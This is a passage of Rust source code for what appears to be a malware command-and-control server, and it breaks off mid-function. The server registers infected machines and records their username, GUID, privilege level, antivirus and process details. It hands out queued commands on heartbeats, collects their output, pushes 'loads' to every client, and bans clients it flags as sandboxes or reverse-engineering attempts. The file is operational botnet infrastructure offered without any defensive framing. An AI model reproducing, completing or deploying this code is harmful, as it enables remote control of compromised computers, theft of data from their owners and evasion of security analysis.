extern crate colored; 

use actix_web::{
    http::StatusCode, post, web, App, HttpRequest, HttpResponse, HttpServer, Responder
};

use std::{
    time::SystemTime, 
    time::UNIX_EPOCH, 
    fs, str, fs::File,
    io::Write, process::exit,
    net::IpAddr,
    process::Command,
    path::Path, 
    sync::{Arc, RwLock},

};

use rsa::{
    pkcs1::{
        DecodeRsaPrivateKey, 
        EncodeRsaPrivateKey, 
        EncodeRsaPublicKey
    }, 
    Pkcs1v15Encrypt, 
    RsaPrivateKey, 
    RsaPublicKey
};

use base64::prelude::*;
use crypto::{ symmetriccipher, buffer, aes, blockmodes };
use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };

use mysql_async::{*, prelude::*};

use colored::Colorize;
use ansi_term;
use random_string::generate;
use lazy_static::lazy_static;
use crate::serde_json::json;
use maxminddb::geoip2;
use serde_json;
use sha256;
use rand;

use std::io::prelude::*;
use flate2::Compression;
use flate2::write::GzEncoder;
use flate2::read::GzDecoder;

use argon2::{
    ParamsBuilder,
    password_hash::{
        rand_core::OsRng,
        PasswordHash, PasswordHasher, PasswordVerifier, SaltString
    },
    Argon2
};

use itertools::Itertools;
use rand::RngCore;
use rand::seq::SliceRandom;


lazy_static! {
    static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref PURGATORY_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref ENABLE_FIREWALL: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
    static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
    static ref IP_DATABASE: Arc<RwLock<Vec<u8>>> = Arc::new(RwLock::new(vec![u8::from(0)]));
    static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new(RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
    static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
}

const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

#[derive(Debug)]
enum GenericError {
    Mysql(Error),
    NoRows,
    _WrongData,
    _ProgramErrored,
    _Expired
}


// If the submission is below 512 characters, it will be written to the DB as normal.
// If the submission is above 512 characters, it will be written to the disk as a storage.

#[post("/gateway")]
async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {

    const HANDSHAKE_P1: usize = 1;
    const HANDSHAKE_P2: usize = 2;
    const CLIENT_ID_LENGTH: usize = 16;

    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
    let enable_firewall = *ENABLE_FIREWALL.read().unwrap();

    let mut connection: Conn = obtain_connection().await;
    let ip: String = req.peer_addr().unwrap().ip().to_string();

    if is_client_blocked(&mut connection, "N/A", &ip).await {
        fprint("restricted", &format!("{} tried sending a request while blocked.", ip));
        return resp_unauthorised();
    }

    let split_body: Vec<&str> = req_body.split(".").collect(); // 0 will always be non-json, either AES key or Client bytes. 1 will either be nothing or json.

    // Modfiy server to generate a "next" byte sequence and store it in the client DB for that client id.
    // If the encrypted message doesn't contain this "next" byte sequence, or the "next" byte sequence is incorrect,
    // the request is being replayed. Block that client forever.

         
    match split_body.len() {
        HANDSHAKE_P2 => {

            if split_body[0].len() == CLIENT_ID_LENGTH && is_client(&mut connection, split_body[0]).await {
                let client_id = split_body[0];

                if enable_firewall && !(get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp()) {
                    block_client(&mut connection, &client_id, "Sending too many requests as a registered client.", &ip, 1200).await;
                    return resp_unauthorised();
                }

                if is_client_blocked(&mut connection, client_id, &ip).await {
                    fprint("restricted", &format!("({}) {} tried doing an action while blocked.", &ip, &client_id));
                    return resp_unauthorised();
                }

                let encryption_key = match get_encryption_key(&mut connection, client_id).await {

                    Ok(result) => result,
                    Err(GenericError::_Expired) => {
                        block_client(&mut connection, "N/A", "Request sent with expired encryption key.", &ip, 1200).await;
                        return resp_unauthorised();
                    },
                    Err(error) => {
                        fprint("error", &format!("(HANDSHAKE_P2 get_encryption_key): {:?}", error));
                        return resp_servererror();
                    }

                };

                let decrypted_raw_json = match aes_256cbc_decrypt(split_body[1], encryption_key.as_bytes()) {
                    Ok(result) => result,
                    Err(_) => {
                        block_client(&mut connection, "N/A", "Sent a registration request encrypted with the wrong AES key.", &ip, 1200).await;
                        return resp_badrequest();
                    }
                }; 

                let submitted_json: serde_json::Value = match serde_json::from_str(str::from_utf8(&decrypted_raw_json).unwrap()) {
                    Ok(result) => result,
                    Err(_) => {
                        block_client(&mut connection, "N/A", "Sent a registration request without valid JSON.", &ip, 1200).await;
                        return resp_badrequest();
                    }
                };

                match key_to_string(&submitted_json, "action").as_str() {

                    "block" => {
                        block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt or sandbox.", 3155695200).await;
                        return resp_unauthorised();
                    },

                    "heartbeat" => {
                        update_last_seen(&mut connection, &client_id).await;
                        match get_current_client_command(&mut connection, &client_id).await {

                            Ok((command_id, cmd_args, cmd_type)) => {
                                return resp_ok_encrypted(&json!({
                                    "command_id": command_id,
                                    "cmd_args": BASE64_STANDARD.encode(&parse_storage_read(&cmd_args)),
                                    "cmd_type": cmd_type
                                }).to_string(),  encryption_key.as_bytes()).await;
                            },

                            Err(GenericError::NoRows) => {
                                return resp_ok_encrypted("Ok", encryption_key.as_bytes()).await;
                            },
                            
                            Err(_) => {
                                fprint("error", "At gateway (command_info)");
                                return resp_servererror();
                            },
                        }
                    },

                    "submit_output" => {
                        if !all_keys_valid(&submitted_json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
                            block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 3155695200).await;
                            return resp_badrequest();
                        }
                
                        let command_id = key_to_string(&submitted_json, "command_id");
                        let output_id = generate(8, CHARSET);
                
                        // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.

                        match get_command_info(&mut connection, &command_id).await {
                            Ok((command_id, cmd_args, cmd_type, time_issued)) => {
                                match connection.exec_drop(
                            
                                    r"INSERT INTO outputs (
                                    output_id, command_id, 
                                    client_id, cmd_args, 
                                    cmd_type, output, 
                                    time_issued, time_received
                                    ) VALUES 
                                    
                                    ( :output_id, :command_id, 
                                    :client_id, :cmd_args, 
                                    :cmd_type, :output, 
                                    :time_issued, :time_received)",
                    
                                    params! {
                                        "output_id" => &output_id,
                                        "command_id" => &command_id,
                                        "client_id" => &client_id,
                                        "cmd_args" => &cmd_args,
                                        "cmd_type" => &cmd_type,
                                        "output" => &parse_storage_write(key_to_string(&submitted_json, "output").as_bytes()),
                                        "time_issued" => &time_issued,
                                        "time_received" => get_timestamp(),
                    
                                    }
                                ).await {
                                    Ok(_) => {
                                        connection.exec_drop(r"DELETE FROM commands WHERE command_id = :command_id", params! { "command_id" => &command_id }).await.unwrap();
                                    
                                        fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
                                        update_last_seen(&mut connection, &client_id).await;        
                            
                                        return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
                                    },
                                    Err(e) => fprint("error", &format!("Unable to insert output: {}",e))
                                };
                            },
                            Err(_) => {
                                fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
                                return resp_badrequest();
                            }
                        };
                    }

                    &_ => {
                        fprint("error", &format!("({}) {} sent a request containing an unsupported action.", &ip, &client_id));
                        return resp_unsupported();
                    }
                }


                return resp_ok_encrypted("Well done! Connection succesfully established.", encryption_key.as_bytes()).await;
            } else {


                let decrypted_first_half = match (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &BASE64_STANDARD.decode(&split_body[0]).unwrap()) {
                    Ok(result) => result,
                    Err(_) => {
                        block_client(&mut connection, "N/A","Client sent a registration request encrypted with the wrong RSA key.", &ip, 1200).await;
                        return resp_badrequest();
                    }
                }; 

                let provided_encryption_key = str::from_utf8(&decrypted_first_half).unwrap();
                let purgatory_selection_sql: std::result::Result<QueryResult<'_, '_, _>, Error> = connection.query_iter(r"SELECT encryption_key,expiration_time,request_ip FROM purgatory").await;
                let selected_purgatory = purgatory_selection_sql.unwrap().collect::<Row<>>().await;

                for row in selected_purgatory.unwrap() {
                    if value_to_str(&row, 0) == provided_encryption_key {

                        if &value_to_str(&row, 2) != &ip {
                            block_client(&mut connection, "N/A", "IP which requested hash differs from which submitted it.", &value_to_str(&row, 2), 3155695200).await;
                            block_client(&mut connection, "N/A", "IP which requested hash differs from which submitted it.", &ip, 3155695200).await;
                            return resp_badrequest();
                        }
                        
                        if value_to_u64(&row, 1) < get_timestamp() {
                            block_client(&mut connection, "N/A", "Took to long to solve the hash.", &ip, 1200).await;
                            return resp_badrequest();
                        }

                        drop(
                            connection.exec_drop(r"DELETE FROM purgatory WHERE encryption_key = :encryption_key", 
                            params! { "encryption_key" => &provided_encryption_key }).await
                        );

                        let decrypted_raw_json = match aes_256cbc_decrypt(split_body[1], provided_encryption_key.as_bytes()) {
                            Ok(result) => result,
                            Err(_) => {
                                block_client(&mut connection, "N/A", "Sent a registration request encrypted with the wrong AES key.", &ip, 1200).await;
                                return resp_badrequest();
                            }
                        }; 

                        let client_data_json = match serde_json::from_str(str::from_utf8(&decrypted_raw_json).unwrap()) {
                            Ok(result) => result,
                            Err(_) => {
                                block_client(&mut connection, "N/A", "Sent a registration request without valid JSON.", &ip, 1200).await;
                                return resp_badrequest();
                            }
                        };

                        if !all_keys_valid(&client_data_json, 
                            vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "client_bytes"],
                            vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "string"]
                        ) {
                            block_client(&mut connection, "N/A", "Missing one or more JSON keys.", &ip, 1200).await;
                            return resp_badrequest();
                        }

                        let client_id = String::from(&sha256::digest(format!("{}{}{}", 
                            key_to_string(&client_data_json, "guid"), 
                            key_to_string(&client_data_json, "username"),
                            &*API_SECRET.read().unwrap()
                        ))[..16]);

                        if !is_client(&mut connection, &client_id).await {
                            match connection.exec_drop(
                                r"INSERT INTO clients (
                                    client_id, version, uac, ip,
                                    country, 
                                    username, guid, cpu, 
                                    gpu, ram, antivirus, 
                                    path, pid, last_seen, 
                                    first_seen, encryption_key,
                                    key_expiration
                                ) 
                                
                                VALUES (
                                    :client_id, :version, :uac, :ip,
                                    :country,
                                    :username, :guid, :cpu,
                                    :gpu, :ram, :antivirus,
                                    :path, :pid, :last_seen,
                                    :first_seen, :encryption_key,
                                    :key_expiration
                                )",
                                params! {
                                    "client_id" => &client_id,
                                    "version" => key_to_u64(&client_data_json, "version"),
                                    "uac" => key_to_bool(&client_data_json, "uac"),
                                    "ip" => &ip,
                                    "country" => ip_to_country(&ip).await,
                                    "username" => key_to_string(&client_data_json, "username"),
                                    "guid" => key_to_string(&client_data_json, "guid"),
                                    "cpu" => key_to_string(&client_data_json, "cpu"),
                                    "gpu" => key_to_string(&client_data_json, "gpu"),
                                    "ram" => key_to_u64(&client_data_json, "ram"),
                                    "antivirus" => key_to_string(&client_data_json, "antivirus"),
                                    "path" => key_to_string(&client_data_json, "path"),
                                    "pid" => key_to_u64(&client_data_json, "pid"),
                                    "last_seen" => get_timestamp(),
                                    "first_seen" => get_timestamp(),
                                    "encryption_key" => &provided_encryption_key,
                                    "key_expiration" => get_timestamp() + connection_interval
                                }
                            ).await {
                                Ok(_) => {

                                    fprint("success", &format!("{}", 
                                        format!("({}) {} registered with username {}", 
                                        &ip.yellow(),  
                                        client_id.yellow(), 
                                        key_to_string(&client_data_json, "username").yellow()
                                    )));

                                    return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
                                },
                                Err(e) =>  {
                                    fprint("error", &format!("Unable to insert new client data into db: {}",e));
                                    return resp_servererror();
                                }
                            };
                        }

                        // Code below here runs if it's already a client.

                        if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {
                            match connection.exec_drop(
                                r"UPDATE clients SET uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, encryption_key = :encryption_key, key_expiration = :key_expiration WHERE client_id = :client_id",
                                params! {
                                    "uac" => key_to_bool(&client_data_json, "uac"),
                                    "ip" => &ip,
                                    "country" => ip_to_country(&ip).await,
                                    "cpu" => key_to_string(&client_data_json, "cpu"),
                                    "gpu" => key_to_string(&client_data_json, "gpu"),
                                    "ram" => key_to_u64(&client_data_json, "ram"),
                                    "antivirus" => key_to_string(&client_data_json, "antivirus"),
                                    "path" => key_to_string(&client_data_json, "path"),
                                    "pid" => key_to_u64(&client_data_json, "pid"),
                                    "last_seen" => get_timestamp(),
                                    "client_id" => &client_id,
                                    "encryption_key" => &provided_encryption_key,
                                    "key_expiration" => get_timestamp() + connection_interval
                                }
                            ).await {
                                Ok(_) => {
                                    fprint("success", &format!("{}", 
                                        format!("({}) {} with username {} reconnected.", 
                                        &ip.yellow(),  
                                        client_id.yellow(), 
                                        key_to_string(&client_data_json, "username").yellow()
                                    )));

                                    update_last_seen(&mut connection, &client_id).await;        
                                    return resp_ok_encrypted(&client_id, provided_encryption_key.as_bytes()).await;
                                },
                                Err(e) => {
                                    fprint("error", &format!("Unable to update client data: {}", e));
                                    return resp_servererror();
                                }
                            };
        
                        } else {
                            block_client(&mut connection, &client_id, "Re-registering too quickly.", &ip, 1200).await;
                            return resp_servererror();
                        }

                    };                            
                }
            }
        }
            

        // Part of handshake where we issue the hash that the client needs to crack
        HANDSHAKE_P1 => {


            let decrypted_first_half = match (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &BASE64_STANDARD.decode(&split_body[0]).unwrap()) {
                Ok(result) => result,
                Err(_) => {
                    block_client(&mut connection, "N/A","Client sent a registration request encrypted with the wrong RSA key.", &ip, 1200).await;
                    return resp_badrequest();
                }
            }; 

            let client_bytes = decrypted_first_half;
            
            let items = random_bytes(8);
            let mut all_bytes: Vec<Vec<u8>> = vec![];

            for perm in items.iter().permutations(items.len()).unique() {
                let mut temp = vec![];
                for byte in perm { temp.push(*byte); }
                all_bytes.push(temp);
            }
            
            let server_bytes: &Vec<u8> = all_bytes.choose(&mut rand::thread_rng()).unwrap();
            let client_seed: &Vec<u8> =  all_bytes.choose(&mut rand::thread_rng()).unwrap();

            let server_bytes_hash = argon2_hash(&server_bytes.as_slice());
        
            let encryption_key = format!("{}", 
                &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32]
            );

            fprint("info", &format!("Encryption key generated for the client: {}", &encryption_key));

            match connection.exec_drop(
            
                r"INSERT INTO purgatory (
                    encryption_key, expiration_time, request_ip
                ) VALUES 
                
                ( :encryption_key, :expiration_time, :request_ip )",

                params! {
                    "encryption_key" => &encryption_key,
                    "expiration_time" => &get_timestamp() + *CONNECTION_INTERVAL.read().unwrap(),
                    "request_ip" => &ip

                }
            ).await {
                Ok(_) => (),
                Err(e) => fprint("error", &format!("Failed to insert key into purgatory: {}", e))
            };

            return resp_ok_encrypted(&json!({
                "server_hash": server_bytes_hash,
                "seed": BASE64_STANDARD.encode(&client_seed)
            }).to_string(), &client_bytes).await;

        }
        _ => {
            fprint("error", "Too many or too little splits in the message. Might be network error, ignoring.");
            return resp_servererror()
        }
    };

    block_client(&mut connection, "N/A", "Sending malformed requests or sending too quickly.", &ip, 1200).await;
    return resp_unauthorised();

    /* 
    let encryption_key = encryption_key.unwrap();
    let decrypted_body = aes_256cbc_decrypt(&req_body[16..], &decrypted_first_half).await;

    match decrypted_body {
        Ok(_) => (),
        Err(_) => {
            block_client(&mut connection, &client_id, "Unable to decrypt information sent by client.", &ip, 1200).await;
            return resp_unauthorised();
        }
    }

    let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypted_body.unwrap()).unwrap()).unwrap();

    if !key_exists(&json, "action") {
        block_client(&mut connection, "Sent malformed request, no action provided.", &client_id, &ip, 1200).await;
        return resp_unauthorised();
        
    } 

    else if key_to_string(&json, "action") == "block" {
        block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt, or sandbox.", 3155695200).await;
        return resp_unauthorised();

    } else if key_to_string(&json, "action") == "heartbeat" { 

        // If the client is banned, we will go to the else. If it isn't, we will update the last seen time.
 

    } else if key_to_string(&json, "action") == "submit_output" {

        if !all_keys_valid(&json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
            block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 3155695200).await;
            return resp_badrequest();
        }

        let command_id = key_to_string(&json, "command_id");
        let output_id = generate(8, CHARSET);

        // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
        
        if is_command(&mut connection, &command_id, &client_id).await && !is_client_blocked(&mut connection, &client_id, &ip).await {

            let (command_id, cmd_args, cmd_type, time_issued) = get_command_info(&mut connection, &command_id).await.unwrap();
            let output_insert: std::result::Result<Vec<String>, Error> = connection.exec(
            
                r"INSERT INTO outputs (
                output_id, command_id, 
                client_id, cmd_args, 
                cmd_type, output, 
                time_issued, time_received
                ) VALUES 
                
                ( :output_id, :command_id, 
                :client_id, :cmd_args, 
                :cmd_type, :output, 
                :time_issued, :time_received)",

                params! {
                    "output_id" => &output_id,
                    "command_id" => &command_id,
                    "client_id" => &client_id,
                    "cmd_args" => &cmd_args,
                    "cmd_type" => &cmd_type,
                    "output" => &parse_storage_write(key_to_string(&json, "output").as_bytes()),
                    "time_issued" => &time_issued,
                    "time_received" => get_timestamp(),

                }
            ).await;

            connection.exec_drop(
                r"DELETE FROM commands WHERE command_id = :command_id",
                params! {
                    "command_id" => &command_id,
                }
            ).await.unwrap();
        
            match output_insert {
                Ok(_) => (),
                Err(e) => fprint("error", &format!("Unable to delete command: {}",e))
            }
            fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
            update_last_seen(&mut connection, &client_id).await;        

            return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
        } else {
            fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
            return resp_badrequest();
        }

    } else {
        block_client(&mut connection, &client_id, "Didn't provide a valid action.", &ip, 3155695200).await;
        return resp_badrequest();
    }

    */
}



#[post("/api/issue_load")]
async fn api_issue_load(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
        let parsed_cmd_args = &parse_storage_write(key_to_string(&json, "cmd_args").as_bytes());
        let load_id: String = generate(8, CHARSET);

        match connection.exec_drop(  
            r"INSERT INTO loads (
                load_id, required_amount, cmd_args, 
                is_recursive, cmd_type, 
                time_issued
            ) VALUES (
                :load_id, :required_amount, :cmd_args, 
                :is_recursive, :cmd_type,
                :time_issued
            )",
            params! {
                "load_id" => &load_id,
                "cmd_args" => parsed_cmd_args,
                "cmd_type" => key_to_string(&json, "cmd_type"),
                "required_amount" => key_to_u64(&json, "required_amount"),
                "is_recursive" => key_to_bool(&json, "is_recursive"),
                "time_issued" => get_timestamp(),
            }
        ).await {
            Ok(_) => (),
            Err(e) => fprint("error", &format!("Unable to insert data into load: {}",e)), 
        }

        let is_recursive_text;
        if key_to_bool(&json, "is_recursive") {
            is_recursive_text = "Recursive";
        } else {
            is_recursive_text = "Non-recursive";
        }

        task_all_clients(&parsed_cmd_args, &key_to_string(&json, "cmd_type"), &load_id).await;
        
        fprint("success", &format!("{} load created for command {} with these args: {}", 
            is_recursive_text.yellow(), key_to_string(&json, "cmd_type"), parsed_cmd_args.yellow()
        ));

        return resp_ok(load_id);
    } else {
        fprint("failure", &format!("Request was sent to /api/issue without authentication."));
        return resp_unauthorised();

    }
}


#[post("/api/blocks_list")]
async fn api_blocks_list(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
    
        let mut block_selection = match connection.query_iter(r"SELECT * FROM blocks").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(block_selection_sql) Unable to fetch client list");
                return resp_servererror();
            }, 
        };

        let mut json_blocks_list = json!({});   
        for row in block_selection.collect::<Row<>>().await.unwrap() {

            json_blocks_list[value_to_str(&row, 0)] = json!(
                {
                    "client_id": value_to_str(&row, 1),
                    "reason": value_to_str(&row, 2),
                    "ip": value_to_str(&row, 3),
                    "banned_until": value_to_u64(&row, 4),
                }
            );            
        }

        return resp_ok(json_blocks_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/blocks_list without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/remove_block")]
async fn api_remove_block(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;

        if is_block(&mut connection, &key_to_string(&json, "block_id")).await {
        
            match connection.exec_drop(
                r"DELETE FROM blocks WHERE block_id = :block_id;",  
                params! {
                    "block_id" => key_to_string(&json, "block_id"),
                }
            ).await {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(block_removal_sql) Unable to remove load: {}", e));
                    return resp_servererror();
                }, 
            };

            return resp_ok(String::from("Successfully removed block."));
        } else {
            return resp_badrequest();
        }
    } else {
        fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/clients_list")]
async fn api_clients_list(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
        let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
    
        let mut client_selection = match connection.query_iter(r"SELECT * FROM clients").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to fetch client list");
                return resp_servererror();
            }, 
        };

        let mut json_clients_list = json!({});
      
        for row in client_selection.collect::<Row<>>().await.unwrap() {

            let is_online = {
                if value_to_u64(&row, 13) + connection_interval > get_timestamp() {
                    true
                } else {
                    false
                }
            };

            json_clients_list[value_to_str(&row, 0)] = json!(
                {
                    "version": value_to_u64(&row, 1),
                    "uac": value_to_bool(&row, 2),
                    "ip": value_to_str(&row, 3),
                    "country": value_to_str(&row, 4),
                    "username": value_to_str(&row, 5),
                    "guid": value_to_str(&row, 6),
                    "cpu": value_to_str(&row, 7),
                    "gpu": value_to_str(&row, 8),
                    "ram":value_to_u64(&row, 9),
                    "antivirus": value_to_str(&row, 10),
                    "path": value_to_str(&row, 11),
                    "pid": value_to_u64(&row, 12),
                    "last_seen":value_to_u64(&row, 13),
                    "first_seen": value_to_u64(&row, 14),
                    "online": is_online,
                }
            );            
        }


        return resp_ok(json_clients_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/clients_list without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/get_output")]
async fn api_get_output(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        
        let mut connection: Conn = obtain_connection().await;

        let mut output_selection = match connection.exec_iter(
            r"SELECT * FROM outputs WHERE client_id=:client_id", 
            params! {
                "client_id" => key_to_string(&json, "client_id")
            }
        ).await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(output_selection_sql) Unable to fetch outputs");
                return resp_servererror();
            }, 
        };

        let mut json_outputs_list = json!({});
        let selected_outputs = output_selection.collect::<Row<>>().await;

        for row in selected_outputs.unwrap() {
   
            json_outputs_list[value_to_str(&row, 0)] = json!(
                {
                    "command_id": value_to_str(&row, 1),
                    "client_id": value_to_str(&row, 2),
                    "cmd_args": value_to_str(&row, 3),
                    "cmd_type": value_to_str(&row, 4),
                    "output": BASE64_STANDARD.encode(&parse_storage_read(&value_to_str(&row, 5))),
                    "time_issued": value_to_str(&row, 6),
                    "time_recieved": value_to_str(&row, 7),
                }
            );            
        }

        return resp_ok(json_outputs_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/get_output without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/loads_list")]
async fn loads_list(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;
    
        let mut load_selection = match connection.query_iter(r"SELECT * FROM loads").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(load_selection_sql) Unable to fetch loads");
                return resp_servererror();
            }, 
        };

        let mut json_loads_list = json!({});

        for row in load_selection.collect::<Row>().await.unwrap() {
            json_loads_list[value_to_str(&row, 0)] = json!({
                "required_amount": value_to_str(&row, 2),
                "is_recursive": value_to_bool(&row, 2),
                "cmd_args": value_to_str(&row, 3),
                "cmd_type": value_to_str(&row, 4),
                "time_issued": value_to_u64(&row, 5),
            });            
        }
        
        return resp_ok(json_loads_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/loads_list without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/remove_load")]
async fn remove_load(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;

        if is_load(&mut connection, &key_to_string(&json, "load_id")).await {
        
            match connection.exec_drop(
                r"DELETE FROM loads WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(load_removal_sql) Unable to remove load: {}", e));
                    return resp_servererror();
                }, 
            };
        
            match connection.exec_drop(
                r"DELETE FROM commands WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(command_removal_sql) Unable to remove commands: {}", e));
                    return resp_servererror();
                }, 
            };
            
            return resp_ok(String::from("Successfully removed load."));
        } else {
            return resp_badrequest();
        }
    } else {
        fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/statistics")]
async fn statistics(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());
    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();

    if key_to_string(&json, "api_secret") == api_secret {

        
        let mut connection = obtain_connection().await;
        let mut connection2 = obtain_connection().await;

        let mut command_selection = match connection.query_iter(r"SELECT command_id FROM commands").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(command_selection_sql) Unable to get a list of commands.");
                return resp_servererror();
            }, 
        };

        
        let mut client_selection = match connection2.query_iter(r"SELECT last_seen,uac,first_seen FROM clients").await {
            Ok(result) => result,
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to get a list of clients.");
                return resp_servererror();
            }, 
        };


        // Client shit
        let mut online_clients_amount :u64 = 0;
        let mut offline_clients_amount: u64 = 0;
        let mut uac_clients_amount: u64 = 0;
        let mut last_new_client: u64 = 0;

        // Command Shit
        let mut active_command_amount: u64 = 0;

        let selected_commands = command_selection.collect::<Row<>>().await;
        for _ in selected_commands.unwrap() { active_command_amount += 1; }

        let selected_clients = client_selection.collect::<Row<>>().await;
        for row in selected_clients.unwrap() {
            
            if value_to_u64(&row, 2) > last_new_client {
                last_new_client = value_to_u64(&row, 2);
            }
            
            if value_to_bool(&row, 1) {
                uac_clients_amount += 1;
            }

            if value_to_u64(&row, 0) + connection_interval < get_timestamp() {
                offline_clients_amount += 1;
            } else {
                online_clients_amount += 1;
            }
        }

        let json_to_return = json!({
            "offline_clients": offline_clients_amount,
            "online_clients": online_clients_amount,
            "total_clients": offline_clients_amount + online_clients_amount,
            "uac_clients": uac_clients_amount,
            "last_new_client": last_new_client,
            "active_commands": active_command_amount,
        });

        return resp_ok(json_to_return.to_string());
        
    } else {
        fprint("failure", &format!("Request was sent to /api/statistics without authentication."));
        return resp_unauthorised();
    }
}


// ------------------------ DB functions ------------------------

async fn obtain_connection() -> Conn {
    return (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap()
} 

async fn is_client(connection: &mut Conn, client_id: &str) -> bool {

    let client_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT client_id FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => client_id,
        }
    ).await;

    match client_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "At is_client: {}", 
                e
            ));
            false
        },
    }
}


async fn is_load(connection: &mut Conn, load_id: &str) -> bool { 

    let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT load_id FROM loads WHERE load_id = :load_id",
        params! {
